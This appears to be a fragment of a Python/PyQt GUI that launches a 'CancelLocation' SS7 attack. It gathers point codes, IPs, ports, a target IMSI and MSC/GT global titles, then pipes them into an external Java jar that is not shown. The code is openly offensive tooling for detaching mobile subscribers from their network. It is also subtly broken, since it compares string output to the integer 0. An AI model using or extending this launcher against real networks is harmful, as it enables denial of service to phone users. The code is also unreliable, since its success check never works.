        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        imsi = self.IMSI_input.text()
        msc = self.MSC_GTinput.text()
        gt = self.GT_input.text()

        jar_file = 'CancelLocation.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(purge_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(imsi + '\n')
            java_process.stdin.write(msc + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'CancelLocation Attack', f"CancelLocation executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"CancelLocation Failed to Launch: {str(e)}")
            print(e)
